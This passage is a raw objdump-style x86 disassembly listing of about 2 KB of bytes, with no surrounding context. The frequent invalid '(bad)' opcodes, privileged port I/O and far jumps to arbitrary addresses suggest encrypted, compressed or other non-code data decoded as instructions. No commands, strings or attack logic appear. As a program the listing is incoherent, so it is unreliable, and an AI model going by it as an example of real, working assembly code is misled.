  401ff8:	(bad)  
  401ff9:	xchg   ebp,eax
  401ffa:	test   BYTE PTR [edx],0x27
  401ffd:	mov    edx,0x996a18c3
  402002:	(bad)  
  402004:	inc    edx
  402005:	cli    
  402006:	push   0x3b
  402008:	bnd jmp 0x401ff3
  40200b:	pop    es
  40200c:	loop   0x402012
  40200e:	jmp    0x3e11a25c
  402013:	mov    al,0xe8
  402015:	js     0x402069
  402017:	sub    ecx,DWORD PTR [ebx+0x47]
  40201a:	gs daa 
  40201c:	jne    0x402016
  40201e:	pop    ecx
  40201f:	in     eax,dx
  402020:	push   ds
  402021:	aam    0xaf
  402023:	test   bl,0x66
  402026:	popa   
  402027:	sti    
  402028:	push   ebx
  402029:	pop    edi
  40202a:	xchg   DWORD PTR [eax+0x17],esp
  40202d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40202e:	xchg   ebx,eax
  40202f:	loope  0x40200b
  402031:	pop    es
  402032:	push   esp
  402033:	and    al,0x70
  402035:	out    0x74,al
  402037:	push   0x8ae33ef1
  40203c:	adc    al,0x1f
  40203e:	rcr    DWORD PTR [esi+0x6e],1
  402041:	cs clc 
  402043:	jp     0x4020a8
  402045:	sbb    esi,DWORD PTR [edx-0x49bc914d]
  40204b:	mov    ebp,0x9be0912f
  402050:	dec    esi
  402051:	sub    al,0x36
  402053:	mov    bl,0xe0
  402055:	in     al,dx
  402056:	stc    
  402057:	call   0x8cc166bd
  40205c:	scas   eax,DWORD PTR es:[edi]
  40205d:	xor    eax,0x2f85e300
  402062:	test   al,0x4b
  402064:	add    BYTE PTR [ebx-0x5e8e70a9],ch
  40206a:	rcr    ebp,cl
  40206c:	faddp  st(4),st
  40206e:	jl     0x402047
  402070:	fisttp DWORD PTR [ebp+esi*1+0x69]
  402074:	retf   
  402075:	cmc    
  402076:	fwait
  402077:	and    BYTE PTR [ebp+0x27],al
  40207a:	adc    BYTE PTR [esi-0x67d244ce],cl
  402080:	push   es
  402081:	cmp    BYTE PTR [edi-0x47837d74],dh
  402087:	pop    edx
  402088:	inc    ecx
  402089:	push   0x29
  40208b:	ja     0x40202b
  40208d:	aam    0x42
  40208f:	jno    0x402025
  402091:	sti    
  402092:	fld    QWORD PTR [edi-0x13f89120]
  402098:	mov    DWORD PTR [ecx+0x73],0x76c29b3d
  40209f:	and    eax,esp
  4020a1:	mov    DWORD PTR [edx+0x7b],esi
  4020a4:	int    0x1e
  4020a6:	xor    DWORD PTR [ebx+ecx*4],ecx
  4020a9:	inc    esi
  4020aa:	push   ebx
  4020ab:	div    DWORD PTR [ebx]
  4020ad:	(bad)  
  4020ae:	mov    edi,0x3de71a41
  4020b3:	imul   esi,esi,0x2
  4020b6:	add    al,0x2b
  4020b8:	pop    ds
  4020b9:	adc    dh,bh
  4020bb:	enter  0x5dc9,0xa0
  4020bf:	or     al,0x8d
  4020c1:	mov    ecx,DWORD PTR [ebp-0x31dc86d3]
  4020c7:	mov    edi,0x874afdad
  4020cc:	inc    esp
  4020cd:	adc    eax,0xec436a2c
  4020d2:	(bad)  
  4020d3:	sahf   
  4020d4:	inc    ecx
  4020d5:	aam    0x6c
  4020d7:	out    dx,al
  4020d8:	call   0x607b3deb
  4020dd:	aad    0x7a
  4020df:	push   esp
  4020e0:	das    
  4020e1:	cmp    BYTE PTR [ecx],bl
  4020e3:	into   
  4020e4:	(bad)  
  4020e5:	mov    edi,0xd31f356d
  4020ea:	sbb    DWORD PTR [edx],edi
  4020ec:	retf   0x1e9
  4020ef:	inc    edx
  4020f0:	or     ebx,ebx
  4020f2:	aaa    
  4020f3:	xchg   BYTE PTR [ebp+0x62e43ece],bh
  4020f9:	mov    ds:0xd862c989,eax
  4020fe:	inc    edi
  4020ff:	lock and al,0x24
  402102:	jge    0x4020f9
  402104:	(bad)  
  402105:	call   0x63405ebb
  40210a:	pop    ecx
  40210b:	xor    BYTE PTR ds:0xec91ab61,bh
  402111:	add    eax,0x8f7b2ba2
  402116:	sub    al,0x17
  402118:	imul   ecx,DWORD PTR fs:[eax*2+0x15aa379a],0xffffffb3
  402121:	add    DWORD PTR [edi-0x20908d14],ebx
  402127:	fmul   QWORD PTR [esp+esi*1-0x5865aa77]
  40212e:	adc    BYTE PTR [esi+0xd],bl
  402131:	mov    dh,0x41
  402133:	dec    eax
  402134:	xor    ebx,ecx
  402136:	mov    cl,0x44
  402138:	cmp    eax,0x77d54abd
  40213d:	or     ah,BYTE PTR [edx-0x4b]
  402140:	add    dl,dl
  402142:	imul   esp,DWORD PTR [esp+ebp*1],0x43
  402146:	cmp    bh,ah
  402148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402149:	imul   esi,DWORD PTR [ebx+ebx*4-0x2a],0x5b
  40214e:	cwde   
  40214f:	inc    esp
  402150:	xor    DWORD PTR [esi],esp
  402152:	jle    0x40214f
  402154:	jbe    0x402141
  402156:	push   edi
  402157:	pushf  
  402158:	lods   eax,DWORD PTR ds:[esi]
  402159:	fistp  DWORD PTR [eax+ebx*1]
  40215c:	mov    esi,0xc9db2476
  402161:	pushf  
  402162:	(bad)  
  402164:	test   eax,0x4fcbef9c
  402169:	popf   
  40216a:	cmp    DWORD PTR ds:0xf21ad70a,esp
  402170:	pop    es
  402171:	fnstcw WORD PTR [ecx]
  402173:	mov    edi,0x5f68af04
  402178:	jnp    0x402190
  40217a:	and    dh,BYTE PTR [ebx]
  40217c:	dec    ebp
  40217d:	imul   esi,DWORD PTR [esi+ebx*1-0x7],0x78e11c53
  402185:	sbb    eax,0x5061760
  40218a:	jp     0x402188
  40218c:	and    al,0x49
  40218e:	dec    ebp
  40218f:	pop    ebp
  402190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402191:	out    dx,al
  402192:	jnp    0x4021d3
  402194:	ds cmp eax,0x64953be1
  40219a:	mov    cs,WORD PTR [edx+edx*1]
  40219d:	daa    
  40219e:	hlt    
  40219f:	ins    BYTE PTR es:[edi],dx
  4021a0:	mov    edi,0x1bdcd133
  4021a5:	mov    esi,0x74a5583b
  4021aa:	push   eax
  4021ab:	jno    0x4021a0
  4021ad:	dec    eax
  4021ae:	dec    edx
  4021af:	and    al,0x9d
  4021b1:	ds mov ?,edx
  4021b4:	(bad)  
  4021b5:	and    ah,BYTE PTR [esi-0xc]
  4021b8:	xchg   dh,al
  4021ba:	push   cs
  4021bb:	xlat   BYTE PTR ds:[ebx]
  4021bc:	sub    DWORD PTR [ecx],esp
  4021be:	stos   DWORD PTR es:[edi],eax
  4021bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021c0:	dec    edi
  4021c1:	ror    DWORD PTR [eax+0x7b524ea8],0xbd
  4021c8:	xor    al,0x90
  4021ca:	xchg   edx,eax
  4021cb:	cmp    BYTE PTR [ebp+0x39],al
  4021ce:	add    esp,ebp
  4021d0:	inc    edi
  4021d1:	dec    esp
  4021d2:	js     0x402247
  4021d4:	sub    WORD PTR [eax],0x33ed
  4021d9:	jns    0x4021ad
  4021db:	or     esp,edx
  4021dd:	xor    al,0x76
  4021df:	pop    edx
  4021e0:	jbe    0x4021c6
  4021e2:	rcr    DWORD PTR [ecx+0x2d],1
  4021e5:	pusha  
  4021e6:	jle    0x402229
  4021e8:	xor    cl,BYTE PTR [esi+0x18]
  4021eb:	cmp    al,0x37
  4021ed:	inc    eax
  4021ee:	out    0x7b,eax
  4021f0:	popf   
  4021f1:	mov    ecx,0x739e9fcc
  4021f6:	sbb    ecx,edi
  4021f8:	push   0xffffffcb
  4021fa:	xor    al,0x32
  4021fc:	(bad)  
  4021fd:	lods   al,BYTE PTR ds:[esi]
  4021fe:	dec    esp
  4021ff:	dec    edx
  402200:	push   esp
  402201:	push   es
  402202:	jle    0x4021f9
  402204:	daa    
  402205:	jne    0x4021e6
  402207:	test   al,0x96
  402209:	and    dl,ah
  40220b:	and    eax,0xe0159c0c
  402210:	dec    ebx
  402211:	lds    eax,FWORD PTR [ebp-0x20eb9907]
  402217:	je     0x40226c
  402219:	inc    ebx
  40221a:	scas   eax,DWORD PTR es:[edi]
  40221b:	adc    al,BYTE PTR [edx]
  40221d:	ss (bad) 
  40221f:	int    0x8
  402221:	retf   
  402222:	jne    0x40225c
  402224:	lahf   
  402225:	enter  0x43cf,0x8c
  402229:	and    al,0x6e
  40222b:	and    eax,0xcff126b9
  402230:	mov    WORD PTR [ecx],gs
  402232:	xchg   ebp,eax
  402233:	fmul   DWORD PTR ds:[esi]
  402236:	in     al,dx
  402237:	retf   
  402238:	enter  0x40c,0x21
  40223c:	xor    ch,BYTE PTR [edi-0x57]
  40223f:	inc    ecx
  402240:	push   es
  402241:	enter  0x482c,0xbf
  402245:	ins    BYTE PTR es:[edi],dx
  402246:	setae  dl
  402249:	mov    DWORD PTR [eax+ebx*1+0x731be521],0x8a67aa6a
  402254:	dec    eax
  402255:	cmp    bl,0x19
  402258:	test   DWORD PTR [ebx+0x649cedf],ebp
  40225e:	lods   eax,DWORD PTR ds:[esi]
  40225f:	rcr    BYTE PTR [ecx],1
  402261:	pop    edi
  402262:	sbb    DWORD PTR [edx+0x7d],ebx
  402265:	popf   
  402266:	into   
  402267:	jnp    0x4022a4
  402269:	jecxz  0x4022b7
  40226b:	pop    ebx
  40226c:	retf   0xccb8
  40226f:	cld    
  402270:	nop
  402271:	mov    ch,0xed
  402273:	xchg   esp,eax
  402274:	sbb    eax,0xc61f94d7
  402279:	fwait
  40227a:	rcl    bl,0x4
  40227d:	dec    ecx
  40227e:	mov    ch,BYTE PTR [eax]
  402280:	aaa    
  402281:	outs   dx,DWORD PTR ds:[esi]
  402282:	pop    ss
  402283:	mov    gs,WORD PTR [esi]
  402285:	adc    ch,BYTE PTR [edx-0x2ca62212]
  40228b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40228c:	fwait
  40228d:	inc    esp
  40228e:	mov    ds:0xa9b593fd,eax
  402293:	sbb    al,0x7b
  402295:	pushf  
  402296:	mov    cl,0xb3
  402298:	sub    BYTE PTR [ebx-0x2df8760],al
  40229e:	mov    DWORD PTR [edi-0xb20a92b],0xee9dbbda
  4022a8:	int    0xec
  4022aa:	sub    DWORD PTR [edi],esp
  4022ac:	inc    edi
  4022ad:	mov    dh,0x93
  4022af:	ret    0xf9e6
  4022b2:	mov    eax,0x54b078f6
  4022b7:	mov    al,0x13
  4022b9:	mov    ah,0xfb
  4022bb:	and    ecx,DWORD PTR [ebx+0x59]
  4022be:	jmp    0x86c83009
  4022c3:	pop    ebx
  4022c4:	mov    cl,0x62
  4022c6:	aaa    
  4022c7:	(bad)  
  4022c9:	and    eax,0xc3571d4b
  4022ce:	pop    eax
  4022cf:	sti    
  4022d0:	push   esi
  4022d1:	jge    0x402340
  4022d3:	sub    BYTE PTR [ecx+0x729689eb],dl
  4022d9:	inc    ecx
  4022da:	les    ecx,FWORD PTR [ebx-0x34]
  4022dd:	(bad)  
  4022de:	sub    al,0x32
  4022e0:	mov    DWORD PTR [ecx],esi
  4022e2:	sbb    DWORD PTR [ebx],ecx
  4022e4:	ja     0x4022ed
  4022e6:	mov    eax,ds:0x18e759f8
  4022eb:	fimul  DWORD PTR [eax]
  4022ed:	xchg   BYTE PTR [ebx-0x9b9d01d],ah
  4022f3:	imul   ebp,DWORD PTR [edi],0x35
  4022f6:	push   cs
  4022f7:	sbb    ah,BYTE PTR [edx+0x1af1e76e]
  4022fd:	stc    
  4022fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022ff:	es pop ecx
  402301:	add    DWORD PTR [eax],ebp
  402303:	mov    bh,0x8b
  402305:	enter  0xe159,0xd1
  402309:	adc    eax,0x633b9304
  40230e:	mov    ah,0xe6
  402310:	call   0x64a9c420
  402315:	push   es
  402316:	(bad)  
  402318:	sti    
  402319:	ret    
  40231a:	mov    ds:0x144b57f,al
  40231f:	push   esp
  402320:	aad    0x1e
  402322:	dec    ecx
  402323:	out    0x9d,al
  402325:	cli    
  402326:	inc    edx
  402327:	dec    eax
  402328:	mov    ebp,0xe54d16c
  40232d:	mov    dl,0xff
  40232f:	mov    esp,0xd4f4e3a9
  402334:	mov    esp,0x855c941b
  402339:	xor    eax,0x1d3e9285
  40233e:	push   ecx
  40233f:	rcl    DWORD PTR [edx-0x5a62d1e9],cl
  402345:	jae    0x40238c
  402347:	pop    eax
  402348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402349:	mov    eax,0x197f49f8
  40234e:	xchg   al,dl
  402350:	push   esp
  402351:	sbb    ah,BYTE PTR [eax]
  402353:	mov    esi,DWORD PTR [esi+0x59]
  402356:	enter  0x8f99,0x14
  40235a:	cdq    
  40235b:	pop    ecx
  40235c:	xor    BYTE PTR [edx+0x55],al
  40235f:	adc    DWORD PTR [edx-0x26],ebp
  402362:	mov    esp,0xf85b6d00
  402367:	test   DWORD PTR [ebp+0x52535241],edi
  40236d:	enter  0x4332,0x50
  402371:	into   
  402372:	cwde   
  402373:	clc    
  402374:	jo     0x4023ae
  402376:	xchg   ecx,eax
  402377:	cmp    BYTE PTR [edi],dh
  402379:	inc    esp
  40237a:	inc    esi
  40237b:	push   ebp
  40237c:	loop   0x402381
  40237e:	or     BYTE PTR [ebx+0x43c86381],dh
  402384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402385:	adc    ah,dl
  402387:	pusha  
  402388:	inc    esi
  402389:	cmp    DWORD PTR [esi-0x5320798c],esp
  40238f:	cmp    eax,0x22b09aa1
  402394:	jne    0x40233f
  402396:	xor    eax,0xa3b4ad09
  40239b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40239c:	adc    eax,edi
  40239e:	inc    ecx
  40239f:	repz cld 
  4023a1:	mov    WORD PTR [edi],ds
  4023a3:	ins    DWORD PTR es:[edi],dx
  4023a4:	(bad)  
  4023a5:	sti    
  4023a6:	sub    al,0x4a
  4023a8:	push   cs
  4023a9:	mov    ebp,0x6f2bcfad
  4023ae:	retf   0x9d57
  4023b1:	sbb    eax,0x8c658737
  4023b6:	pop    ss
  4023b7:	inc    eax
  4023b8:	call   0x907c3b7f
  4023bd:	xlat   BYTE PTR ds:[ebx]
  4023be:	adc    ebx,esp
  4023c0:	mov    ch,0xcd
  4023c2:	mov    ch,0x62
  4023c4:	sbb    bl,BYTE PTR [ebx-0x3480153f]
  4023ca:	outs   dx,BYTE PTR ds:[esi]
  4023cb:	add    DWORD PTR [ebx+0x694436b2],0xd78f810f
  4023d5:	add    BYTE PTR [esi+0x71],al
  4023d8:	mov    ecx,0x4f97c8eb
  4023dd:	js     0x40239a
  4023df:	addr16 out 0x8a,al
  4023e2:	mov    edx,0x51322059
  4023e7:	mov    ch,0xc9
  4023e9:	test   eax,0xf4aea817
  4023ee:	imul   BYTE PTR [edx-0x7e29c595]
  4023f4:	dec    edx
  4023f5:	inc    edx
  4023f6:	data16 mov ah,0x9d
  4023f9:	sahf   
  4023fa:	pop    edi
  4023fb:	push   ss
  4023fc:	add    dl,BYTE PTR [eax]
  4023fe:	mov    ?,eax
  402400:	jnp    0x4023f4
  402402:	enter  0x513b,0x7d
  402406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402407:	std    
  402408:	(bad)  
  402409:	fisub  WORD PTR [eax+0x63]
  40240c:	retf   0x1d3f
  40240f:	push   0xc8bc076d
  402414:	adc    edx,edx
  402416:	out    dx,al
  402417:	popf   
  402418:	add    eax,0x884b2d7a
  40241d:	cmp    al,0x29
  40241f:	dec    ecx
  402420:	mov    WORD PTR [edx+0x55],fs
  402423:	mov    ebp,0x7b968920
  402428:	inc    DWORD PTR [eax]
  40242a:	in     al,0xb5
  40242c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40242d:	cmp    DWORD PTR [ebx+0x66],edi
  402430:	or     eax,DWORD PTR [ecx+eiz*8]
  402433:	xchg   BYTE PTR [ebp-0x2a53d8ba],cl
  402439:	loopne 0x40246a
  40243b:	stos   BYTE PTR es:[edi],al
  40243c:	(bad)  
  40243d:	out    0xc2,al
  40243f:	and    al,0x2e
  402441:	jle    0x4024ab
  402443:	and    ebp,DWORD PTR [ebx]
  402445:	push   eax
  402446:	aad    0x8b
  402448:	push   edx
  402449:	inc    ebx
  40244a:	jnp    0x40249d
  40244c:	inc    ebp
  40244d:	test   DWORD PTR [eax],eax
  40244f:	sub    eax,0x5e5aa62b
  402454:	push   cs
  402455:	rcl    BYTE PTR [ebp+edx*1-0x72],1
  402459:	scas   eax,DWORD PTR es:[edi]
  40245a:	in     al,0x5
  40245c:	inc    esi
  40245d:	pop    ss
  40245e:	and    al,0xe9
  402460:	loope  0x4023e3
  402462:	cmp    DWORD PTR [esi+ebx*4+0x76],ebp
  402466:	add    dh,bl
  402468:	pop    eax
  402469:	push   0xffffff9b
  40246b:	or     eax,0x2cad2294
  402470:	shl    DWORD PTR [ecx],0xd1
  402473:	sub    DWORD PTR [esi],edi
  402475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402476:	pop    esp
  402477:	lods   eax,DWORD PTR ds:[esi]
  402478:	sub    DWORD PTR [ebx-0x2580b456],0x7d9b0ff1
  402482:	xchg   edx,eax
  402483:	add    DWORD PTR [edi],edx
  402485:	and    ebp,edx
  402487:	aas    
  402488:	dec    esi
  402489:	nop
  40248a:	pop    ss
  40248b:	hlt    
  40248c:	cwde   
  40248d:	inc    ebp
  40248e:	(bad)  
  40248f:	fsubr  QWORD PTR [eax+0x3e7006ec]
  402495:	cmc    
  402496:	(bad)  
  402497:	out    dx,al
  402498:	ficomp DWORD PTR [ecx+0x4cd87e9]
  40249e:	push   ss
  40249f:	adc    DWORD PTR [esi*1+0x3b3e165b],ecx
  4024a6:	sbb    esp,ecx
  4024a8:	xchg   BYTE PTR [edi-0x1a0a0679],cl
  4024ae:	fnstenv [eax+0x3637d687]
  4024b4:	dec    esi
  4024b5:	xchg   DWORD PTR [ecx-0x45cb21a6],ebx
  4024bb:	mov    BYTE PTR [edi-0x1352965d],ch
  4024c1:	mov    bl,0x9
  4024c3:	iret   
  4024c4:	push   es
  4024c5:	cmc    
  4024c6:	in     al,dx
  4024c7:	dec    eax
  4024c8:	retf   
  4024c9:	jp     0x4024c6
  4024cb:	or     bl,bh
  4024cd:	mov    dl,0x7
  4024cf:	shl    ecx,0x94
  4024d2:	xchg   BYTE PTR [ebp-0x6463b4f9],bh
  4024d8:	jae    0x402527
  4024da:	(bad)  [edx+0x46bcc60b]
  4024e0:	repz in al,0x9
  4024e3:	jne    0x402547
  4024e5:	pop    DWORD PTR [edx-0x57010a00]
  4024eb:	or     edi,ecx
  4024ed:	add    BYTE PTR [ebp-0x6c5fb037],al
  4024f3:	and    dl,0x35
  4024f6:	inc    ebx
  4024f7:	pusha  
  4024f8:	mov    esi,0x2b829ce0
  4024fd:	test   esp,0xc0532dfa
  402503:	jge    0x402578
  402505:	rcr    BYTE PTR [ebp-0x34],cl
  402508:	outs   dx,DWORD PTR ds:[esi]
  402509:	pushf  
  40250a:	mov    edx,0x5de1d674
  40250f:	add    eax,0x37e116bc
  402514:	scas   al,BYTE PTR es:[edi]
  402515:	adc    eax,0xc9c1e154
  40251a:	mov    BYTE PTR [edx+0x36],al
  40251d:	call   DWORD PTR [eax-0x4fb5b708]
  402523:	pop    ds
  402524:	xchg   DWORD PTR [eax-0x19cd4984],esp
  40252a:	push   0xa54ccad6
  40252f:	xor    eax,0x4472fa75
  402534:	cwde   
  402535:	jo     0x4024e3
  402537:	jns    0x40254d
  402539:	sub    BYTE PTR [edi-0x1b6d51b],0x11
  402540:	xor    BYTE PTR [ecx+0x45a23e6e],bh
  402546:	cmp    BYTE PTR [edx+edx*4+0x7a6ad5a],0x0
  40254e:	push   cs
  40254f:	sahf   
  402550:	push   ebx
  402551:	(bad)  
  402552:	ins    DWORD PTR es:[edi],dx
  402553:	push   ss
  402554:	and    al,0xeb
  402556:	cmp    dl,BYTE PTR [esi+0x77f665c4]
  40255c:	add    eax,0x3eebd6a
  402561:	icebp  
  402562:	js     0x4025b7
  402564:	jg     0x40258a
  402566:	int3   
  402567:	jne    0x40250e
  402569:	adc    eax,0x1bfd6bae
  40256e:	mov    cl,0xfe
  402570:	or     BYTE PTR [edi-0x7d],0x2c
  402574:	cwde   
  402575:	rol    DWORD PTR [eax],1
  402577:	test   al,0x37
  402579:	inc    bp
  40257b:	fwait
  40257c:	mov    esp,0xb4a1174e
  402581:	add    al,0xde
  402583:	fdivr  DWORD PTR [eax-0x25eed384]
  402589:	pusha  
  40258a:	push   esp
  40258b:	or     DWORD PTR [edi+ecx*1+0x34f4a5a6],ebp
  402592:	pushf  
  402593:	adc    al,0x57
  402595:	loopne 0x4025b0
  402597:	sahf   
  402598:	gs xor dh,ch
  40259b:	mov    bh,0x4c
  40259d:	jg     0x402525
  40259f:	imul   edi,DWORD PTR [ebx],0x5f
  4025a2:	mov    ds:0x9810fafa,eax
  4025a7:	(bad)  [edx]
  4025a9:	jg     0x40259b
  4025ab:	je     0x402563
  4025ad:	retf   
  4025ae:	pusha  
  4025af:	or     dh,BYTE PTR [edx+0x45fbe203]
  4025b5:	push   ecx
  4025b6:	push   esp
  4025b7:	cwde   
  4025b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025b9:	je     0x4025b7
  4025bb:	ins    BYTE PTR es:[edi],dx
  4025bc:	xor    BYTE PTR [ecx+eiz*1+0x3b860425],bh
  4025c3:	and    eax,0xf86e65bf
  4025c8:	sbb    al,0xda
  4025ca:	retf   0x327
  4025cd:	jno    0x402561
  4025cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025d0:	jno    0x402622
  4025d2:	inc    edi
  4025d3:	and    edx,eax
  4025d5:	xchg   ebp,eax
  4025d6:	jp     0x402626
  4025d8:	lahf   
  4025d9:	fldcw  WORD PTR [edi+0x1]
  4025dc:	shl    DWORD PTR [ebx+0x43f6b8a2],cl
  4025e2:	jg     0x402625
  4025e4:	sub    al,0xb8
  4025e6:	adc    dh,BYTE PTR [edx-0x4f]
  4025e9:	jne    0x4025be
  4025eb:	hlt    
  4025ec:	iret   
  4025ed:	stc    
  4025ee:	cmovns ebx,DWORD PTR [ebx]
  4025f1:	in     al,0xd7
  4025f3:	inc    BYTE PTR [edx+0x31]
  4025f6:	loope  0x40265d
  4025f8:	mov    ds:0xacfba8e4,al
  4025fd:	sub    DWORD PTR [edi-0x2cbbd74],edi
  402603:	push   ebp
  402604:	lods   al,BYTE PTR ds:[esi]
  402605:	push   0x59d42468
  40260a:	sbb    BYTE PTR [ebx-0x1c],bh
  40260d:	sub    al,0x82
  40260f:	inc    esp
  402610:	xchg   ecx,eax
  402611:	jns    0x402633
  402613:	jecxz  0x40261d
  402615:	mov    esp,DWORD PTR [ebx+edi*2+0x6015e760]
  40261c:	pushf  
  40261d:	mov    ebp,0x34f70c87
  402622:	or     eax,0x3715a46d
  402627:	adc    bh,BYTE PTR [eax-0x11]
  40262a:	(bad)  
  40262b:	or     al,0xf3
  40262d:	mov    bh,0xab
  40262f:	dec    eax
  402630:	loope  0x4025cd
  402632:	cs clc 
  402634:	push   ds
  402635:	push   ebx
  402636:	fdivp  st(4),st
  402638:	push   edx
  402639:	inc    edi
  40263a:	leave  
  40263b:	jne    0x4026a6
  40263d:	cmp    eax,0x19542f09
  402642:	pushf  
  402643:	inc    ebp
  402644:	test   eax,0x28216d09
  402649:	mov    ah,0xc9
  40264b:	xor    eax,0xb621a1e2
  402650:	adc    eax,0xcd2cfc23
  402655:	sub    eax,0x4acd56d0
  40265a:	hlt    
  40265b:	retf   
  40265c:	mov    BYTE PTR [ebx+0x27c2e1e4],bh
  402662:	sub    al,0x68
  402664:	int    0x30
  402666:	arpl   WORD PTR [edi-0x24],si
  402669:	es cdq 
  40266b:	mov    dh,0xfd
  40266d:	mov    eax,ds:0xb28e0854
  402672:	out    0xc3,al
  402674:	jnp    0x402612
  402676:	pop    ebp
  402677:	(bad)  
  402678:	cmc    
  402679:	sbb    edi,ebx
  40267b:	fwait
  40267c:	xchg   ebx,eax
  40267d:	cmp    eax,0xf54e0e7f
  402682:	aam    0xcd
  402684:	enter  0x3aaa,0x7b
  402688:	pop    ecx
  402689:	jmp    0x19208e57
  40268e:	push   edi
  40268f:	or     DWORD PTR [edx+0x2d],esp
  402692:	repnz push ecx
  402694:	xchg   eax,esi
  402696:	push   0x497bb3b9
  40269b:	xchg   edi,eax
  40269c:	push   ecx
  40269d:	sti    
  40269e:	add    eax,DWORD PTR ss:[edx+esi*8+0x4c2e0b88]
  4026a6:	scas   al,BYTE PTR es:[edi]
  4026a7:	sbb    DWORD PTR es:[eax+0x4],esi
  4026ab:	pusha  
  4026ac:	call   0xb083:0xdb2ee285
  4026b3:	call   0x85473790
  4026b8:	add    esp,ecx
  4026ba:	sbb    ah,ch
  4026bc:	adc    WORD PTR [eax-0x3bdfb9ee],cx
  4026c3:	cmp    dl,bl
  4026c5:	mov    BYTE PTR [edi],ah
  4026c7:	arpl   WORD PTR [esi],si
  4026c9:	iret   
  4026ca:	pop    edx
  4026cb:	popa   
  4026cc:	cmp    BYTE PTR [eiz*2-0x1571671b],bh
  4026d3:	sbb    ah,BYTE PTR [ebp+0x48f4b741]
  4026d9:	mov    ch,0x3b
  4026db:	rcr    edx,cl
  4026dd:	push   ss
  4026de:	add    eax,esi
  4026e0:	xor    BYTE PTR [ebx+0x4c],al
  4026e3:	cwde   
  4026e4:	inc    esp
  4026e5:	clc    
  4026e6:	fidivr DWORD PTR [eax]
  4026e8:	out    dx,eax
  4026e9:	push   eax
  4026ea:	cmc    
  4026eb:	jo     0x402723
  4026ed:	and    ecx,DWORD PTR [ecx+0x1d0ec160]
  4026f3:	xor    BYTE PTR [esi],ah
  4026f5:	cwde   
  4026f6:	fnstsw WORD PTR [edx]
  4026f8:	or     eax,0x3f8e1add
  4026fd:	or     al,0x10
  4026ff:	ja     0x402709
  402701:	clc    
  402702:	dec    esp
  402703:	ret    0x4238
  402706:	stos   BYTE PTR es:[edi],al
  402707:	call   0x130e:0xe2603113
  40270e:	push   ecx
  40270f:	(bad)  
  402710:	test   al,0xb9
  402712:	xchg   esp,eax
  402713:	pop    ecx
  402714:	fnsave [ecx-0x6807b739]
  40271a:	retf   
  40271b:	jae    0x4026cc
  40271d:	sahf   
  40271e:	xchg   ebx,eax
  40271f:	dec    ecx
  402720:	shr    bl,cl
  402722:	lock jnp 0x4026a6
  402725:	push   edx
  402726:	xchg   ebp,eax
  402727:	out    0x9a,eax
  402729:	mov    edx,DWORD PTR [esi+0x54b1c579]
  40272f:	cmp    al,0xc
  402731:	data16 and dl,al
  402734:	(bad)  
  402735:	pop    eax
  402736:	cmp    BYTE PTR [edx],0x6c
  402739:	mov    WORD PTR [ebx-0x7c],gs
  40273c:	xchg   ebx,eax
  40273d:	cld    
  40273e:	adc    esp,ecx
  402740:	xor    BYTE PTR ds:[ecx-0x4dd221ad],al
  402747:	jno    0x402776
  402749:	sub    BYTE PTR [edx+0x5afed27],ch
  40274f:	loop   0x40270a
  402751:	mov    ebp,0xc2732960
  402756:	cmp    cl,dl
  402758:	push   cs
  402759:	mov    cl,0xa6
  40275b:	(bad)  
  40275c:	or     DWORD PTR [edx-0x79],esi
  40275f:	jmp    0x5f7b:0x2e6b0da7
  402766:	mov    ds:0xa6242b72,al
  40276b:	imul   edx
  40276d:	lods   eax,DWORD PTR ds:[esi]
  40276e:	or     cl,ah
  402770:	dec    ebp
  402771:	xchg   edx,eax
  402772:	xor    esp,DWORD PTR [eax+ebp*4+0x6]
  402776:	fdiv   QWORD PTR [edx]
  402778:	ins    DWORD PTR es:[edi],dx
  402779:	mov    esp,0xba578a6c
  40277e:	and    al,0x4f
  402780:	std    
  402781:	mov    BYTE PTR [edx],dh
  402783:	shl    DWORD PTR [esi],0x5c
  402786:	test   bh,cl
  402788:	adc    eax,0x64dcabe9
  40278d:	sbb    al,0x10
  40278f:	lahf   
  402790:	sub    al,0x3f
  402792:	pop    esi
  402793:	ds out 0xf7,al
  402796:	inc    esp
  402797:	push   ecx
  402798:	das    
  402799:	(bad)  
  40279a:	jno    0x4027b1
  40279c:	jb     0x4027cb
  40279e:	xor    eax,0x145882f5
  4027a3:	repnz repz mov edi,0x729bfd0d
  4027aa:	clc    
  4027ab:	js     0x40276a
  4027ad:	rcr    DWORD PTR [ebp-0x3a28fb22],cl
  4027b3:	or     edi,DWORD PTR [esi-0x76]
  4027b6:	pop    ds
  4027b7:	xchg   al,al
  4027b9:	xor    al,0x21
  4027bb:	fbld   TBYTE PTR [esi+esi*1-0x14476ccf]
  4027c2:	dec    cl
  4027c4:	pop    ecx
  4027c5:	leave  
  4027c6:	mov    bl,0x70
  4027c8:	lods   eax,DWORD PTR ds:[esi]
  4027c9:	dec    esi
  4027ca:	dec    ebp
  4027cb:	adc    DWORD PTR ss:[edx-0x65],0x12758fa2
  4027d3:	mov    bl,0x4
  4027d5:	js     0x4027b5
  4027d7:	cwde   
  4027d8:	dec    ebp
  4027d9:	adc    DWORD PTR [ebp-0x47],eax
  4027dc:	rol    BYTE PTR [esi],0x91
  4027df:	jmp    0x4027df
  4027e1:	pop    edi
  4027e2:	add    eax,0xd2a69deb
  4027e7:	adc    DWORD PTR [ecx+0x7f],0xaf3aaa26
  4027ee:	and    BYTE PTR [esi-0x56],al
  4027f1:	add    eax,0x45e45105
  4027f6:	pop    es
  4027f7:	xchg   edx,eax
  4027f8:	xor    eax,0x9e02153d
  4027fd:	and    edi,DWORD PTR [edx+0x5]
  402800:	mov    ebx,0x11d9cb97
  402805:	adc    al,0x9a
  402807:	stc    
  402808:	push   edi
  402809:	dec    ebx
  40280a:	or     al,0xde
